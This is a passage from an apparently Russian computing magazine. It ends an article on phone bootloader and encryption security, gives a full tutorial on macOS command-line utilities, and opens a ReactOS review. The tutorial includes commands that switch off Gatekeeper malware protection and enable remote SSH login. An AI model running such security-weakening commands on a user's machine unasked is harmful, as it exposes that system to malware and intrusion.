погово рить о безопасности, но по факту их решения, мягко говоря, неод‐
нозначны. Так, опе рационная система Tizen не выдержива ет критичес кого
взгляда. Про цити рую сло ва Ами хая Нейдермана: «Возможно, это худший код
из тех, что мне довелось видеть. Все ошиб ки, которые можно было допустить,
были допуще ны. Очевидно, что код писал или проверял кто‐то, кто ничего
не понимает в безопасности. Это все рав но, что поп росить школь ника
написать для вас программное обеспечение».


ПОЧЕМУ ЭТО РАБОТАЕТ И ЧЕМ ОТЛИЧАЕТСЯ ОТ УЯЗВИМОСТИ
MOTOROLA?
Важный момент здесь в том, что инже нерный заг рузчик соз дан силами самой
ком пании Samsung и под писан электронной подписью, которой доверя ет
устройство. С  точки  зрения  телефона  про цесс  доверенной  загрузки
не нарушается, ведь загружается только и исклю чительно код, подписанный
про изводителем. А вот для Motorola это не так: хоть разработчики и обошли
защиту загрузчика, удалось это проделать лишь с использовани ем найденной
уязвимос ти, которую  Motorola успешно  закрыла  в  патче безопас ности
за июль 2017‐го. А вот инженерный заг рузчик Samsung никто не собирается
ни патчить, ни закрывать, ни отзывать ском прометированную электронную
под пись (вооб ще‐то именно это должна была в первую оче редь сде лать ком‐
пания, которая действи тельно — а не на словах — беспокоится о безопас‐
ности).


ВОПРОС ПОЛИТИКИ: APPLE ПРОТИВ SAMSUNG ИЛИ ВСЕ ПРОТИВ
ФБР?
Казалось бы, при чем тут Apple? Давай отмотаем время на полтора года
назад и вспом ним, как дей ствовала компания в момент, когда ФБР и встав‐
ший на сторону агентства американский суд потребовали от Apple соз дать
инструмент (ана лог инженер ного заг рузчи ка), позволивший бы спецслужбам
подоб рать пароль на принадлежав шем террорис ту из Сан‐Бер нардино
iPhone 5c.
  Весной 2016 года Apple не под чинилась требованиям Федераль ного
бюро расследований и не ста ла соз давать код с возможностью под бора
пароля для разбло кировки смартфона. Проб лема защиты информации
переросла в глобальную; на сто рону Apple вста ли такие монс тры индус трии,
как Google, Facebook и Microsoft. В конеч ном итоге в ФБР справились
без помощи Apple, заплатив око ло мил лиона дол ларов израиль ской ком‐
пании Cellebrite за взлом единственного устрой ства.
  Интересно здесь не только то, как рьяно ком пания Apple ринулась отста‐
ивать права своих пользователей на защиту информации в устройствах с iOS,
но и то, к каким пос ледствиям это привело. А пос ледствия замет ные: в Apple
предпринимают шаги, вся чески огра ничи вающие возможности произвола
со сто роны полиции и спецслужб в отно шении поль зовате лей. Так, вскоре
пос ле известных событий компания добавила ряд условий, при совпадении
которых автомати чес ки отключался датчик отпечат ков пальцев, а смартфон
требовал разблокировку паролем. Весьма радикально компания пос тупила
с выпус ком iOS  11,  в  которой  ограничили  возможность исполь зовать
излюбленный  полицейскими  метод  извлечь  данные  из  телефо нов —
с помощью соз дания резервной копии (под робнос ти — в прошлом номере,
«Вопрос доверия. Как iOS 11 защитит тебя от про извола полиции и погранич‐
ников»). Что инте ресно, в Apple ни словом не обмолвились о таких новов‐
ведениях в iOS 11.
  А вот ком пания Samsung любит поговорить о безопасности. «Samsung
гордится сво ими ком плексными решениями, которые обеспечивают пол ную
защиту  поль зовательских  дан ных  и  при ложе ний», —  пишут  они
в пресс‐релизе, рекламирующем систему безопас ности KNOX. Впрочем,
никакая гордость не помешала компании разработать инже нерный загрузчик,
позволя ющий прошивать и как угодно модифицировать устройство в обход
всех пре дохранителей KNOX, а фактичес кое (а не громогласно‐рекламное)
отношение к безопасности — поз волить этому инженерному загрузчику утечь
в свободное плаванье и не озаботиться отзывом электронной подписи ском‐
про метирован ного загрузчика.




Прак тически одновре менно с инженерным загрузчиком для Samsung S7, поз‐
воля ющим сбро сить пароль устройства, появился и некий ана лог для пря‐
мого кон курента на iOS — смартфо на iPhone 7. Недорогая (меньше пятисот
долларов) коробочка и идущий в комплекте софт поз воляют хоть и небыстро
(из‐за искусс твенной задер жки на аппа ратном уровне), но перебирать
пароли к iPhone 7 через режим DFU. Пока мы устройство не тестировали,
но зна комые полицейские уверяют, что по крайней мере для iOS 10 оно впол‐
не работоспособно.



ЗАКЛЮЧЕНИЕ
Че тыре про изводителя — и четыре разных подхода к безопас ности. Режим
прямого дос тупа к хранили щу у LG, не позволяющий тем не менее обой ти
шиф рование; взлом заг рузчи ка целой линейки устрой ств Motorola, позволя‐
ющий обхо дить шифрование, но закрытый ком пани ей с июльским патчем
безопасности; инженер ный загрузчик Samsung, словно спе циально раз‐
работанный для того, что бы кто угод но мог получить полный дос туп к зашиф‐
рованным дан ным; и Apple, все ужесточа ющая фактическую безопасность
устройств без особого шума. Насколько важ на безопасность данных лично
тебе? Думаю, от ответа на этот воп рос может зависеть выбор тво его сле‐
дующе го смартфона.
PCZONE





    ИЗУЧАЕМ УНИКАЛЬНЫЕ УТИЛИТЫ
     КОМАНДНОЙ СТРОКИ MACOS





Знание утилит, которые помога ют работать
с системой, — это, считай, гиковский ана‐
лог владения боевым искусс твом. В прош‐
лой статье я собрал советы по настройке
скрытых парамет ров и выбору программ       Андрей Письменный                                                                                    Шеф‐редактор
для macOS, а в этой мы пойдем глубже         apismenny@gmail.com
и поз накомим ся с ути лита ми коман дной
стро ки, большая часть которых уни кальна
для «мака». Одни помогут в диагностике
системы, другие пригодятся при написа нии
скриптов, третьи облегчат работу с тер‐
миналом.


НАСТРОЙКА СИСТЕМЫ
Смотрим и (не) меняем параметры ядра
Ко ман да sysctl относится ско рее к древней магии Unix, чем к macOS. Она
отве чает за вывод и изменение параметров ядра. Наб рав sysctl ‐ah, ты
уви дишь более 1200 переменных. Считать одно зна чение можно, если ввести
пос ле коман ды его название, а с клю чом ‐n будет выведено только значение.
Нап ример, коман да sysctl ‐n machdep.cpu.brand_string выдает модель
про цессора.





            И это только самый‐самый конец списка

Ме нять парамет ры можно, вводя команды вида


sysctl kern.maxprocperuid=1000

Эта команда  ограничит  тысячей максималь ное  количество процессов,
запущенных от одного пользователя), но, если не знаешь, что делаешь,
рекомендую не баловаться с рабочей системой. В man ты найдешь таблицу,
где перечислены основные параметры. Также мне попада лась ин тересная
статья, в которой автор пишет обертку для sysctl на Swift.




                    По каждой утилите есть подробнейшая справка
                        в man. Тебе нужны версии из разделов (1) или (8)
                       для использования из командной строки и (3) —
                       для вызова в качестве фун кций. Кстати, man
                      удобно читать, если написать наз вание команды
                        в поисковой стро ке Help в стандартном «Тер‐
                        минале», — вывод man откроется в новом окне
                        с при ятным желтым фоном.


Запускаем всё на све те
Ес ли ты достаточно дол го имел дело с «маками», то наверняка стал кивал ся
с launchctl. Это интерфейс к сис теме launchd, которая начиная с Mac OS X
10.4 (Tiger) пришла на смену длинному списку ути лит, позаимс твованных
из FreeBSD (среди них — init, rc, cron и другие). При мечатель но, что launchd
теперь есть и в BSD, а для Linux был раз работан схожий лаунчер — systemd,
который вошел во мно гие современ ные дис трибути вы.
  На первый взгляд launchd делает очень прос тую вещь — запускает и оста‐
нав лива ет про цес сы, руководс твуясь условиями, описанными в конфигура‐
ционных фай лах. Ты найдешь их в ~/Library/LaunchAgents, /Library/
LaunchAgents и /Library/LaunchDaemons (такие же папки есть в /System/
Library/, скрип ты в них отве чают за работу час тей самой macOS). Отличие
демонов от аген тов в том, что демоны запускают ся от имени системы, а аген‐
ты — от име ни пользователя.
  В перечисленных пап ках лежат файлы .plist — то есть XML с опи сани ями
условий запуска. Эти условия могут быть очень разными, что делает launchd
крайне гибкой системой. Например, процес сы мож но запускать и останав‐
ливать по времени подоб но cron, при определен ных изменениях в фай ловой
системе (например, когда в катало ге появляется новый файл или когда мон‐
тируется носитель), в ответ на сетевой вызов и так далее.
  При помощи команд launchtl enable <название_сервиса> и launchtl
disable <название_сервиса> ты можешь активировать и деактивировать
запуск системных или собственных скриптов. В руководс твах также попада‐
ется старый вари ант — load и unload, он тоже работает. Еще полезно знать
о командах launchctl list (вывод названий всех сервисов) и launchctl
kickstart — немедленный запуск, незави симо от настроек.





Под робнее о  launchd  читай  в офи циальной  документации,  на  сай те
launchd.info или вкратце — в бло ге Пола Ансли. Для создания конфигура‐
ционных файлов есть пара графических оболочек — LaunchControl и Lingon
(обе платные). Еще есть ути лита командной строки lunchy, которая слегка
упро щает управле ние.
   Если тебе лень ковыряться со всем этим добром, можешь использовать
ста рый добрый cron. Занятный факт: когда ты создашь файл crontab коман‐
дой crontab ‐e, launchd запустит cron как сервис.


Работаем с Gatekeeper
Бук вы sp в названии ути литы spctl про исхо дят от слов system  policy.
Это интерфейс коман дной стро ки для Gatekeeper, механизма, который изо
всех сил мешает запускать неподписан ные при ложения. Этим он спасает
от шиф ровальщиков неопыт ных пользователей и, увы, немало раздражает
опытных.
   Чтобы посмотреть, работает ли Gatekeeper, пиши


spctl ‐‐status

Пафосный ответ assessments enabled будет означать, что все под контролем.
Если дума ешь, что пора ослабить гайки и отключить Gatekeeper, пиши


sudo spctl ‐‐master‐disable

Когда закончишь с экспериментами, рекомен дую вернуть все как было — для
этого замени параметр на ‐‐master‐enable.
  Посмотреть список разрешенных приложений можешь командой


spctl ‐‐list

А что бы не листать стену текста и видеть только то, что сам раз решил
в диалоговом окне, можешь пофильтровать по отсутствию метки:


spctl ‐‐list | grep UNLABELED





Собс твенно, для ручного добавления при ложе ний в список существу ет хит‐
рая двухступен чатая схема с метками. Сначала добавляешь при ложе ние
и задаешь ему метку:


spctl ‐‐add ‐‐label "Approved" <файл приложения>

А затем разреша ешь все при ложения с этой мет кой:


spctl ‐‐enable ‐‐label "Approved"

Пос ле это го можно добавлять метки к новым прог раммам, и они автомати‐
чески будут занесены в белый спи сок. Точно так же можно разом отозвать
раз решение. Подробнее об этом читай на сайте The Instructional, откуда я
брал при меры.


Ме няем файлы кон фигурации
Об утилите defaults я подробно писал в статье «Об вес macOS». Если вкрат‐
це, то она отве чает за чтение и изме нение конфигура ционных файлов,
которые лежат в пап ках Preferences в сис темной, общей и частных Library.





С точки зрения defaults настройки раз делены на домены — посмотреть их
спи сок ты можешь командой defaults  domains, а вывести переменные
в домене — defaults  read  <название_домена>. Значения переменных
можно менять командой


defaults write <домен> <переменная> ‐<тип> <значение>

При меры перемен ных опять же смот ри в прош лой статье или в коллекции
Кевина Саттла, на которую я уже не раз ссылался.


Настраиваем основные параметры системы
Ути лита systemsetup предназначена для нас трой ки самых базовых вещей
вро де даты и времени или тай мера режима сна. Если вызывать systemsetup
без параметров, то она вой дет в интерактивный режим. Ничего особенно
полез ного  здесь  нет.  Отдель ного  упо минания  заслуживает  разве  что
параметр для активации демона SSH:


sudo systemsetup ‐setremotelogin on

А еще systemsetup побеж дает в номина ции «самый длинный параметр» —
это ‐setdisablekeyboardwhenenclosurelockisengaged, он раз решает бло‐
киро вать клавиатуру сервера, когда тот находит ся в стойке. А что, не так уж
сложно запом нить!


Задаем сетевые настройки
В паре с systemsetup идет networksetup, менеджер сетевых настроек. Инте‐
рак тивно го режима у него нет, пос кольку для пользователя он не несет
никакой ценности: все то же самое мож но настроить в разделе «Сеть»
из «Системных настроек». Зато дергать networksetup из скрип тов или удален‐
но — самое то. Например, команда


networksetup ‐listnetworkserviceorder

вы ведет список кон фигураций. Да, похоже, парамет ры придумы вал тот же
весельчак, что поработал над systemsetup.
   Кстати, за выбор конфигурации отвечает дру гая утилита — scselect.
Без параметров она выведет список, а для выбора можно после scselect
задать метку или номер из предоставленного списка.


Управляем Wi-Fi
Ко ман ду airport можно по праву считать секретной — если ты попыта ешься
прос то вызвать ее из терминала, то ничего не выйдет. Дело в том, что она
скрыта глубоко в системе, и сначала нужно вытащить ее на свет божий. Сде‐
лать это мож но коман дой


sudo ln ‐s /System/Library/PrivateFrameworks/Apple80211.framework/
Versions/Current/Resources/airport /usr/local/bin/airport

Те перь ты можешь в любой момент набрать airport ‐s, и встроенный адап‐
тер Wi‐Fi проведет быстрое ска нирование и выдаст спи сок сетей с ука занием
BSSID,  спо соба шифрования  и  про чих  характеристик.  Под робности
о текущем подключении ты можешь узнать, набрав airport ‐I, а sudo air‐
port ‐z разорвет его.


СБОР ДИАГНОСТИКИ
Смотрим пол ную свод ку о компьюте ре и программах
Ес ли в меню «Яблоко» выб рать пункт «Об этом Mac», а затем нажать на кноп‐
ку «Системный отчет», то ты уви дишь кучу всякой информации о компьютере.
Так вот, утилита system_profiler — это то же самое, но в сто раз подробнее.
Если вызвать system_profiler без параметров, то информация будет
выведе на целиком, что в моем случае озна чает 3,8 Мбайт текста. Так что
рекомендую исполь зовать grep для поиска нужной стро ки или сразу писать
что‐нибудь вро де такого:


system_profiler > ~/Desktop/profile.txt





Сре ди того, что вып люнет system_proﬁler, ты найдешь информацию не только
о системе и устройствах, но и обо всех программах, драйверах, плагинах,
библиотеках и шриф тах. Заодно будут выведе ны части сис темных логов
и еще куча вся кой лабуды. Если все это тебя не инте ресу ет, пиши:


system_profiler ‐detailLevel mini

Тогда ты получишь только све дения о компьютере. Еще можно добавить
параметр ‐xml, чтобы было удобнее обрабатывать полученную информацию
в скрипте.


Об ращаемся к служ бе катало гов
За обще ние со службой каталогов отве чает утилита dscl — Directory Services
Command Line, она в свое время пришла на смену netinfo. Повеяло сисад‐
минскими штуч ками? Так и есть, и подробно оста навливать ся на них мы
не будем. Для затравки пара команд. Можешь вывести спи сок всех поль‐
зователей:


dscl . ‐list /Users

Или информацию о пользователе в виде XML:


dscl . ‐read /Users/<имя пользователя>

Внутри закодирован даже файл с ава таркой! Кста ти, если запустить dscl
без параметров, то она войдет в интерактивный режим, где ты можешь
использовать при вычные команды cd и ls для навигации, а смотреть содер‐
жимое веток — командой read.


Ру лим кешами Directory Services и смотрим список пользовате лей
К dscl прилагается еще одна ути литка — dscacheutil , она отве чает за работу
с кешами службы каталогов. Скорее всего, она извес тна тебе намного лучше,
чем dscl, пос коль ку дол гое время имен но ее нуж но было запускать для сбро‐
са кеша DNS. Кстати, в пос ледних версиях macOS это не работа ет, и вмес то
dscacheutil ‐flushcache теперь нуж но писать


killall ‐HUP mDNSResponder

Что до dscacheutil, то ее удоб но исполь зовать, чтобы выводить спи сок поль‐
зователей:


dscacheutil ‐q user

В отличие от того, что выда ет dscl, результат вос принимать намного легче.





Читаем и (не) сбрасываем значения в NVRAM
У каж дого «мака» есть энергонезависи мая память, в которой хра нятся важ‐
ные для работы компьютера перемен ные. Что именно там лежит? Узнать
поможет команда nvram: напиши nvram ‐xp, и все увидишь. Здесь есть
как безобидные вещи вроде уровня звука и пос ледней рас кладки клавиату ры,
так и более интересные вро де клю ча Find My Mac и совсем уж загадоч‐
ные парамет ры EFI. Все они представлены в двоичном виде, и единс твенный
обры вок опи сания, который мне удалось найти, содержится в утекшем и вы‐
ложен ном на WikiLeaks документе ЦРУ.





Парамет ры можно задавать командой nvram  <переменная>=<значение>,
удалять командой nvram  ‐d  <переменная>  или  загружать  из файла
при помощи nvram  ‐f  <файл>. Сбро сить все можно, набрав nvram  ‐c.
Но обычно параметры NVRAM сбра сывают, толь ко если что‐то пошло не так
и компь ютер не загружается. Для это го нуж но нажать Alt‐Cmd‐P‐R сразу пос‐
ле вклю чения и держать 20 секунд.
  Обрати вни мание: если меняешь параметры утилитой nvram, то они
запишут ся в энергонезависи мую память не моментально, а лишь при вык‐
лючении компьютера в штатном режиме.


Изу чаем статистику опе ративной памяти
Су ществует масса способов посмотреть, нас колько загружена опе ратив ная
память. Пожалуй, самый прос той — это открыть раз дел «Память» в «Монито‐
ринге сис темы»: там в наглядном виде представлены самые полезные
парамет ры. Из командной строки лучше все го исполь зовать top.
   Если же тебе нужна самая под робная информа ция, то ты можешь обра‐
титься к vm_stat. Недостаток этой ути литы — в том, что все значения при‐
водятся в страницах, равных 4 Кбайт. Однако пересчитать не так слож но, и в
интернете есть масса скриптов — например, вот этот однос троч ник на Perl
пересчитывает все в мегабайты.





Еще с помощью vm_stat можно отслеживать изменение загрузки памяти
со вре менем. Для этого пиши


vm_stat ‐c <число> <секунды>

Первый параметр — это количество замеров, второй — интервал между
ними.


Сбрасываем дисковый кеш в памяти
Временно получить пару лишних гигабайтов опе ратив ной памяти помогает
коман да purge. Она вызыва ется от рута, не име ет никаких параметров
и обнуляет дисковый кеш, при водя его в то сос тояние, в котором он был пос‐
ле заг рузки ОС. Но обычно менеджеру памяти такая помощь не тре бует‐
ся — он сам постепенно выг рузит лишнее, если опе ративка будет закан‐
чиваться. В справке говорится, что purge вообще нужен в основном для тес‐
тирования, но кто знает, как повернется жизнь?


Отсле живаем обращения к файловой системе, что бы выявить
проб лемы
Ко ман да fs_usage, запущенная без парамет ров от рута, выводит запись
о каждом обра щении к фай ловой системе. Нуж но это в тех случаях, когда
какая‐то программа пада ет при запуске или выдает загадочные сообщения
об ошибках. Если проб лема в том, что один из фай лов поврежден, то ты смо‐
жешь отыскать его с fs_usage.
   Чтобы пришлось меньше рыться в выдаче, огра ничь сообщения одним
про цессом, написав его название после fs_usage. Если знаешь только ID,
пиши


sudo fs_usage pid <PID>

Другой полезный параметр — это ‐f, после него можно задать фильтр
по операци ям с сетью  (‐f  network), с файлами  (‐f  pathname добавит
колонку с путем) и так далее. Если текст не влезает в строку, добавь ‐w.





Под робнос ти можешь пос мотреть, нап ример, в статье The Mac Observer
или в бло ге mohit.io.


ПОЛЬЗОВАТЕЛЬСКИЕ УТИЛИТЫ


                                     Продолжение статьи →
PCZONE              ← НАЧАЛО СТАТЬИ



         ИЗУЧАЕМ УНИКАЛЬНЫЕ УТИЛИТЫ
          КОМАНДНОЙ СТРОКИ MACOS





Со вершаем откры тия
На первый взгляд коман да open очень прос та — это практичес ки полный
ана лог двой ного клика в графичес ком интерфейсе. Если скор мить ей файл
.app, она запустит программу, если любой другой — то откро ет в ассоцииро‐
ванной с фор матом программе. При желании можно добавить параметр ‐a
и указать, в каком именно при ложе нии открывать, а ‐e принуди тельно откроет
файл в TextEdit (даже если он бинарный).
  Но главный кайф open в другом. В прош лой статье я рассказывал, как нас‐
троить себе удобный спо соб быстро перей ти из Finder в ту же папку в тер‐
минале. Так вот, коман да open — это отличный способ перемещаться
в обратном нап равле нии. Если в качес тве аргу мента open получает каталог,
тот откроется в Finder. Соответс твенно, open . откры вает текущую пап ку.
А еще можно указать «Фай ндеру» на опре деленный файл, если написать open
‐R <файл> (R — от слова reveal).


Работаем с раз делами диска
В пап ке с утилитами на каждом «маке» есть мегапо лезная программа Disk
Utility, которая поз воляет управлять раз делами жестких дисков, форматиро‐
вать их, вручную монтировать сменные носители, создавать образы и так
далее. Ее вари ант для командной строки называется diskutil.
  Поскольку функций много, список команд тоже немаленький. К примеру ты
можешь написать


diskutil list

Эта коман да в отличие от df выводит спи сок физических дисков, а не раз‐
делов. Или можешь запросить подробную информацию о диске:


diskutil info <идентификатор диска>

Ну или, например, вручную демонтировать диск:


diskutil unmountDisk <идентификатор>





При гож дается все это, к примеру, когда готовишь заг рузочную SD‐карту
для Raspberry Pi  (подробное руководство есть на сай те raspberrypi.org).
А еще многие проб лемы с «маком» решаются автоматической починкой прав
на файлы — diskutil repairPermissions /.
  Неп лохая статья о  diskutil с кучей при меров команд есть на сай те
The Instructional.


Соз даем и мон тиру ем образы дисков, пишем CD и DVD
За работу с образами дисков отвечает другая коман да — hdiutil. Что бы при‐
монтировать образ, пиши


hdiutil attach <файл.dmg>

Точ но так же монтируется .iso. А что бы демонтировать:


hdiutil detach /dev/disk<номер>

Этой же ути литой можешь превратить каталог в образ диска. Команда сле‐
дующая:


hdiutil create ‐volname "<Метка тома>" ‐srcfolder <путь к папке> ‐ov
<файл.dmg>

Что бы создать зашифрованный образ, добавь параметры ‐encryption ‐
stdinpass. Про жечь образ на болванку тоже легче легкого: hdiutil burn <
файл с образом>. Восста новить содер жимое диска из образа можно коман‐
дой asr:


sudo asr ‐restore ‐noverify ‐source <файл.dmg> ‐target /Volumes/<диск
>




                      Если в названии фай ла есть пробелы, большинс‐
                        тво утилит потребу ют зак лючить наз вание в двой‐
                     ные кавычки. Это к тому же проще, чем экра ниро‐
                         вать про белы.



Ищем файлы и смотрим метадан ные
Ес ли ты по ста рой линуксовой при вычке уже набирал в маковской консоли
коман ду locate, то сталкивался с тем, что она не работа ет. Вмес то этого ее
сервис предлагают сначала запустить через launchd. Делать этого не нужно,
потому что на «маке» есть намного лучший способ искать фай лы — это ути‐
лита mdfind, которая ищет по базе данных Spotlight.





              Сра зу нашел архивы на внеш нем диске :)

Поль зоваться mdﬁnd не сложнее, чем написать


mdfind <строка для поиска>

Об рати вни мание на то, что поиск ведется не только в названии фай лов, но и
внутри документов, и в метадан ных. Кста ти, для просмотра метаданных
из коман дной строки есть утилита mdls — прос то набери после нее наз вание
файла, и все увидишь.





У mdﬁnd, как ты мог догадать ся, есть полезные параметры. Так, ‐live запус‐
тит эту ути литу в постоян ном режиме и будет выводить наход ки по мере их
появления, ‐onlyin <каталог> ограничит область поис ка одним катало гом,
а ‐name <файл> зас тавит mdﬁnd искать строку только в наз вани ях файлов
и ниг де больше.


Пе рехватываем трафик айфо нов
В macOS вхо дит небольшая, но полезная ути литка rvictl, которая помогает
захватывать трафик мобильных устрой ств с iOS. Подключай айфон или айпад
к компьюте ру, копируй его UDID из iTunes и пиши:


rvictl ‐s <UDID>

В системе появится новый сетевой интерфейс rvi0 — можешь начинать зах‐
ватывать трафик с него командой


sudo tcpdump ‐i rvi0 ‐w <файл.pcap>

Когда закончишь, пиши:


rvictl ‐x <UDID>

Это команда отключения устрой ства. А .pcap можешь открыть в том же Wire‐
shark. Подробнее об этой опе рации можешь почитать в блоге Кей Гаррисона.


Кон вертируем текст
Кон верти ровать тексто вые файлы из одно го фор мата в другой на «маке» —
одно удо воль ствие благода ря утилите textutil. Пишешь


textutil ‐convert txt <файл.docx>

И на выходе получается файл Word. Вмес то DOCX может быть DOC, RTF,
HTML, ODT или WebArchive (веб‐стра ница в формате Safari).
   Точ но  так же можно конверти ровать  в любом направле нии, меняя
параметр и расширение фай ла на выходе. Форматирование, увы, не будет
сохранено. Зато можно массово сконвертировать файлы, задав вместо наз‐
вания маску:


textutil ‐convert txt ~/Desktop/*.docx


Воспро изво дим и кон вертируем аудио
Для работы с аудио в macOS есть три ути литы: afplay, afinfo и afconvert.
Первые две крайне просты в исполь зовании: afplay <файл> запустит вос‐
про изве дение, afinfo  <файл> выдаст под робную информацию о кодеке,
длине и параметрах кодирования.
  А вот afconvert — это менее очевидная в освоении штука (впрочем,
кросс‐плат форменные SoX и FFmpeg тоже не балуют прос тотой). Увы, afcon‐
vert не может создавать MP3, что делает его применение довольно узким.
  Мож но, нап ример, превратить MP3 в рингтон для айфона:


afconvert <файл.mp3> <файл.m4r> ‐f m4af

Или, наоборот, раскодировать MP4 в WAV:


afconvert <файл.m4a> ‐f 'WAVE' ‐d 'ulaw' ‐c 1

Но если ты ищешь утилиту для долгого и плодотворного использования, то я
рекомендую скачать XLD. Вызов из коман дной стро ки она, кстати, тоже под‐
держивает.


Работаем с изоб ражениями
Ес ли от погружения в дебри парамет ров afconvert я тебя попытал ся осторож‐
но отговорить, то за то, чтобы поп робовать маков ский конвертер графики
sips, наоборот, жарко агитирую. Возвращаться к ImageMagick после зна‐
комства с ним вряд ли захочется.
   Чтобы переко диро вать файл из одно го формата в дру гой, напиши


sips ‐s format <формат> <входной файл> ‐‐out <выходной файл>

Для JPEG можно после формата задать уро вень сжатия: formatOptions <
проценты>. Сре ди поддержи ваемых форматов есть JPEG, TIFF, PNG, GIF,
BMP, PSD и некото рые более экзо тические.
  Помимо это го, с картинкой можно делать разные преобразования. Вот
спи сок наибо лее полезных парамет ров, которые можно добавить к команде:
 • с <ширина> <высота> — обрезать;
 • f <horizontal или vertical> — отразить;
 • r <градусы> — повернуть;
 • z <ширина> <высота> — изменить размеры;
 • Z <ширина> — самый полезный параметр, который пропорционально
  сжи мает или растягивает картинку в зависимости от заданной ширины.

Ес ли нужно сконверти ровать сразу мно го картинок, то тебе пригодится вот
такой скриптик на bash:


for i in *.png; do sips ‐s format jpeg ‐s formatOptions 97 "${i}" ‐‐
out "${i%png}jpg"; done

Здесь PNG из текуще го катало га сжи мают ся в JPEG с качеством 97%.

Ко пиру ем катало ги по‑маковски и пользуемся архивато ром
Каж дый, кто имел дело с ник совой командной строкой, зна ет, что для копиро‐
вания нужно писать cp, а копировать катало ги мож но при помощи cp ‐r.
Однако в macOS, помимо этого, есть своя команда копирования каталогов —
ditto. Отли чается она тем, что переходит по симлинкам, копирует метадан‐
ные и права, создает целевую пап ку, если та не существует, а если сущес тву‐
ет, то объеди няет содержимое.
   Пользоваться ditto не слож нее, чем cp: достаточно набрать


ditto <откуда> <куда>

Можешь добавить параметр ‐V ‐‐norsrc, если не хочешь, чтобы метадан‐
ные были ско пированы.
   Вто рое при менение ditto — это работа с архи вами PKZip. Чтобы сжать
содержимое каталога, пиши
    ditto ‐ck ‐‐rsrc ‐‐sequesterRsrc <путь> <файл.zip>
  При этом будет создан архив с файлами, находящимися внут ри каталога,
а сам он в архив не пойдет.
  Для того что бы разар хивировать, надо написать ditto ‐xk <файл> <
каталог>. Фай лы будут помещены в ука занную пап ку, а если ее не существу‐
ет, то ditto соз даст ее. Если хочешь распаковать на мес те, напиши вместо
этого точку (указатель на текущий каталог).


Ис пользуем син тезатор речи
Ко ман да say — это обычно одна из первых вещей, которую показы вают
новичкам. Ну не круто ли, что на любом «маке» можно открыть терминал,
написать say Hello, World! и услышать, как компьютер вслух поприветству‐
ет мир? Круто, но редко кто знает о say больше.
   Во‐первых, у say есть несколько интересных параметров. Мож но зачитать
содержимое тексто вого файла (‐f <файл>), задать голос  (‐v  название),
скорость (‐r <количество слов в минуту>), перенаправить вывод в зву‐
ковой файл  (‐o  <файл>), вклю чить индикатор прог ресса  (‐‐progress)
или отоб ражать текст и подсвечивать слова по ходу чтения (‐i).





Во‐вто рых, say — это довольно серь езный син тезатор речи с развесистой
системой команд. Их впи сывают пря мо в текст в двойных квад ратных скобках.
С азами ты можешь ознакомить ся, про читав пост в блоге Unﬁnished Bitness,
а полный спи сок команд есть в официальной справке.


Де лаем скрин шоты
Де лать скриншоты на «маке» лег ко и прос то: дос таточно нажать Cmd‐Shift‐
3 или Cmd‐Shift‐4 и выделить область (или выб рать окно пробелом). То же
самое мож но сде лать и из коман дной стро ки командой screencapture. Вот
некоторые полезные параметры:
 • t <формат> задает формат (по умолчанию PNG);
 • x выключает звук;
 • c отправит скриншот в буфер обмена;
 • i инте рактивный режим (ана лог Cmd‐Shift‐4);
 • M сразу откроет Mail и создаст пись мо со скриншотом;
 • o отключает тень;
 • C включает кур сор;
 • T <секунды> задает задержку перед снятием скриншота;
 • b делает скриншот тачбара на новых MacBook Pro.

Ес ли не используешь параметр ‐с, то после screencapture нужно добавить
наз вание файла, в который будет записан скриншот.
   Кстати, мне попадалась забавная прог раммка, которая записы вает серию
скриншотов в анимированный GIF, она называется LICEcap.


ОДНОЙ СТРОКОЙ
 • pbcopy и pbpaste — две полезнейшие коман ды: первая переки дывает
   ввод в буфер обме на, вто рая достает отту да вывод. Например, ls l |
  pbcopy ско пирует спи сок файлов в текущем каталоге.
 • sw_vers выводит версию и билд операционной системы (и то и другое
   есть и в выдаче system_proﬁler).
 • osascript выпол няет скрипт на AppleScript или JavaScript (с параметром 
  l JavaScript). С параметром i запустит REPL.
 • installer уста навлива ет программы. Например, можешь написать in
  staller pkg <файл.pkg> target /.
 • softwareupdate ставит обновления сис темы и софта из App Store, их
   список мож но получить с клю чом l .
 • plutil конвертирует фай лы plist между XML, JSON и дво ичным форматом.




                    •Awesome Command Line Apps
                        Вну шитель ная  подборка  примеров  работы
                         с  разными  утилита ми  командной  строки
                      macOS.
                  •OS X Command Line Utilities
                    Еще  одна  кон куриру ющая  под борка,  более
                        скромная.
                         •Quickies for Unix
                      Трюки с коман дами Unix, в том чис ле macOS.
                   •A Sysadmin’s Unixersal Translator (Unix Rosetta
                           Stone)
                        Таблица соответствия команд в разных версиях
                             Unix.
                          •Darling
                       Слой совместимос ти с macOS для Linux (ути‐
                        литы в него не входят).
                    •Прокачай терминал! Полезные трю ки, которые
                        сделают тебя гуру консоли
                      На ша недавняя статья о трю ках с командной
                         стро кой Linux. Для маководов тоже по большей
                          части годится.
                    •По коряем терминал. Как магия консоли поз‐
                         воля ет сделать data engineering проще
                        Разбираем никсовые команды с точ ки зрения
                        работы с большими дан ными.
PCZONE





       ПОЧЕМУ В ЗАМЕНИТЕЛЕ WINDOWS
                  РАБОТАЮТ ТРОЯНЫ,
              НО НЕ РАБОТАЕТ WORD





                                                                   Андрей Васильков
                                                                                   редактор, фронемофил,
                                                                                                  гик, к. м. н. и т. п.
                                                                                  angstroem@hotbox.ru





Сегодня в нашей кунс ткамере демонстрируется необычай‐
ный орга низм — двадцатилетний зародыш операци онки,
который учится делать первые шаги. Пока у него получа ется
толь ко сто ять и осторож но шевелить ся, но он уже пробует
общать ся с внеш ним миром. С виду он похож на Windows
Server 2003, прос то пока уме ет не так много. Знакомься: Re‐
actOS v. 0.4.6, глубокая альфа‐версия.


СТОЯТЬ НЕЛЬЗЯ ПАДАТЬ!
Навер няка ты мно гое слышал об этой опенсорсной раз работ ке. Все‐таки ее
дела ют с девянос тых годов и активно пиарят, особенно в последнее время.
Док лады про нее мож но было услышать на Google Summer of Code, немецких
хакато нах и российских презентациях правительственного уровня. ReactOS
создается по лицензиям GPL/BSD/X11 и дос тупна на разных языках, сре ди
которых есть русский.
  Проект ReactOS удачно вписался в отечественную программу импорто‐
замещения. 1 апреля 2015 года Мин комсвя зи России присудило заявке
«Создание операци онной системы с откры тым исходным кодом на базе Re‐
actOS для ПК, ноутбуков и других мобильных устрой ств» второе место
в номинации «Кли ентские и серверные операционные системы». Почему же
мы до сих пор не перешли поголовно на этот сво бодный аналог Windows?
  Для отве та на этот вопрос мы провели собственное тестирование Reac‐
tOS. Попробовали поставить ее на два ноут бука: очень и не очень старый.
